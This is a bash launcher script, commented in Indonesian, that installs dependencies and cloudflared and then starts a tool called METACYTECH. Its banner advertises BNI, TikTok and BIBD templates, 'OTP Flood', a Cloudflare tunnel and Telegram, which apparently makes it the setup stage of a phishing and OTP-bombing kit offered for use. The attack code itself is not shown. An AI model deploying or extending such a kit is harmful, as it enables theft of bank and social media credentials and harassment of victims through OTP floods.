#!/bin/bash
# METACYTECH - Launcher for Linux / Android (Termux)
# Cross-platform launcher - works on Linux, macOS, and Android (Termux)

# Colors
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
WHITE='\033[1;97m'
DIM='\033[2m'
RESET='\033[0m'

clear

# ── Banner (sama persis dengan run.bat) ────────────────────────────
echo -e "${CYAN}"
echo "  ============================================================"
echo ""
echo "   ███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗"
echo "   ████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║"
echo "   ██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║"
echo "   ██║╚██╔╝██║ ██╔══╝      ██║    ██╔══██║ ██║        ╚██╔╝      ██║    ██╔══╝   ██║      ██╔══██║"
echo "   ██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║"
echo "   ╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝"
echo ""
echo -e "${CYAN}  ============================================================${RESET}"
echo ""
echo -e "  ${WHITE}Multi Template: BNI + TikTok + BIBD + OTP Flood${RESET}"
echo -e "  ${DIM}Cloudflare Tunnel  *  Telegram  *  OTP Testing${RESET}"
echo ""
echo -e "${CYAN}  ============================================================${RESET}"
echo ""

# ── Cek lokasi: Termux + external storage → auto pindah ──────────
if [ -n "$TERMUX_VERSION" ] || [ -d "/data/data/com.termux" ]; then
    CURRENT_DIR=$(pwd)
    if echo "$CURRENT_DIR" | grep -q "/storage/emulated/0"; then
        echo -e "${YELLOW}  [!] TERDETEKSI: Project di storage eksternal (Download).${RESET}"
        echo -e "${YELLOW}      External storage TIDAK support symlink (EACCES error).${RESET}"
        echo -e "${YELLOW}      npm install WAJIB di home directory Termux.${RESET}"
        echo ""
        echo -e "${CYAN}  [*] Memindahkan project ke ~/metacytech-tools ...${RESET}"

        # Pindah ke home
        TARGET_DIR="$HOME/metacytech-tools"
        if [ -d "$TARGET_DIR" ]; then
            echo -e "${YELLOW}  [!] $TARGET_DIR sudah ada, menghapus dulu...${RESET}"
            rm -rf "$TARGET_DIR"
        fi
        cp -r "$CURRENT_DIR" "$TARGET_DIR"
        cd "$TARGET_DIR"
        echo -e "${GREEN}  [✓] Project dipindah ke: $TARGET_DIR${RESET}"
        echo ""
    fi
fi

# ── Check Python ──────────────────────────────────────────────────
PYTHON_CMD=""
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
else
    echo -e "${RED}  [ERROR] Python tidak ditemukan! Install Python 3.8+${RESET}"
    echo ""
    if command -v pkg &> /dev/null; then
        echo -e "${YELLOW}  Termux: pkg install python${RESET}"
    fi
    echo ""
    exit 1
fi

# ── Check launcher.py ─────────────────────────────────────────────
if [ ! -f "launcher.py" ]; then
    echo -e "${RED}  [ERROR] launcher.py tidak ditemukan!${RESET}"
    echo "  Current dir: $(pwd)"
    echo ""
    exit 1
fi

# ── Check and install Node.js dependencies ────────────────────────
if [ ! -d "node_modules" ]; then
    echo -e "${YELLOW}  Installing dependencies...${RESET}"
    echo -e "${DIM}  (Ini bisa 3-10 menit di HP, sabar ya){RESET}"
    echo ""
    
    # Cek apakah filesystem support symlink
    touch /tmp/.symlink_test 2>/dev/null
    ln -sf /tmp/.symlink_test /tmp/.symlink_test_link 2>/dev/null
    SYMLINK_OK=$?
    rm -f /tmp/.symlink_test /tmp/.symlink_test_link

    if [ $SYMLINK_OK -eq 0 ]; then
        npm install
    else
        echo -e "${YELLOW}  Filesystem tidak support symlink. Pakai --no-bin-links...${RESET}"
        npm install --no-bin-links
    fi
    
    NPM_EXIT=$?
    if [ $NPM_EXIT -ne 0 ]; then
        echo ""
        echo -e "${RED}  [ERROR] npm install gagal! (kode: $NPM_EXIT)${RESET}"
        echo -e "${YELLOW}  Coba manual:${RESET}"
        echo -e "    ${WHITE}npm install --no-bin-links${RESET}"
        echo -e "    ${WHITE}bash run.sh${RESET}"
        echo ""
        exit $NPM_EXIT
    fi
    echo -e "${GREEN}  Dependencies installed.{RESET}"
    echo ""
fi

# ── Check and install cloudflared (Termux / Linux) ────────────────
if ! command -v cloudflared &> /dev/null; then
    echo -e "${YELLOW}  cloudflared not found, attempting to install...${RESET}"
    if command -v pkg &> /dev/null; then
        # Termux
        pkg install cloudflared -y 2>/dev/null || echo -e "${YELLOW}  Manual install: pkg install cloudflared${RESET}"
    elif command -v apt &> /dev/null; then
        # Debian/Ubuntu
        ARCH=$(uname -m)
        if [ "$ARCH" = "x86_64" ]; then
            wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O /tmp/cloudflared && chmod +x /tmp/cloudflared && sudo mv /tmp/cloudflared /usr/local/bin/ 2>/dev/null || echo -e "${YELLOW}  Manual install needed${RESET}"
        elif [ "$ARCH" = "aarch64" ]; then
            wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O /tmp/cloudflared && chmod +x /tmp/cloudflared && sudo mv /tmp/cloudflared /usr/local/bin/ 2>/dev/null || echo -e "${YELLOW}  Manual install needed${RESET}"
        fi
    fi
fi

# ── Run the launcher ──────────────────────────────────────────────
echo -e "${CYAN}  Starting METACYTECH launcher...${RESET}"
echo -e "${CYAN}  ============================================================${RESET}"
echo ""
$PYTHON_CMD launcher.py

# ── If launcher exits with error, show message ────────────────────
if [ $? -ne 0 ]; then
    echo ""
    echo -e "${RED}  ============================================================${RESET}"
    echo -e "${RED}  [ERROR] Launcher error!${RESET}"
    echo -e "${RED}  ============================================================${RESET}"
    echo ""
fi
